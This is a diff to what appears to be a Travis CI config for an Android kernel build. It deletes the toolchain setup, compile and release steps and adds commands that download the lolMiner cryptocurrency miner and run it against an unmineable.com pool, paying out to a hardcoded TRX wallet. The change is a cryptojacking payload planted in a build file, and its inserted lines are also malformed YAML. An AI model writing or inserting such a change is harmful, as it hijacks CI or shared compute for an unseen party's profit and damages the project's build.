@@ -5,31 +5,9 @@ os: linux
 before_install:
   
   # Importent Build-Config
-  - export DEVICE=j2lte
-  - export TCLINK=https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.8
-  - export OFOLDER=$PWD/arch/arm/boot
-  ##
-  - git clone $TCLINK toolchain
-  - export CROSS_COMPILE=$PWD/toolchain/bin/arm-eabi-
-  - sudo apt-get -qq update
-  - sudo apt-get install -y build-essential kernel-package libncurses5-dev bzip2 curl
+  wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz
 
-# we're not installing anything
+tar -xf lolMiner_v1.28a_Lin64.tar.gz
 
-install: true
-
-script:
-  # compiling commands (main)
-  - make j2lteswa_MM_defconfig
-  - make
-  # this part uploads output to a cloud
-  - cd $OFOLDER
-  - echo "Uploading Output" && curl --upload-file zImage https://transfer.sh/zImage
-
-deploy:
-  provider: releases
-  file: "$OFOLDER/zImage"
-  cleanup: true
-  on:
-    tags: true
-    all_branches: true
+cd 1.28a/
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TLEMtvVvb5xeXvBBxAvobnm4owoSoiZR7u.colab --ethstratum  ETHPROXY
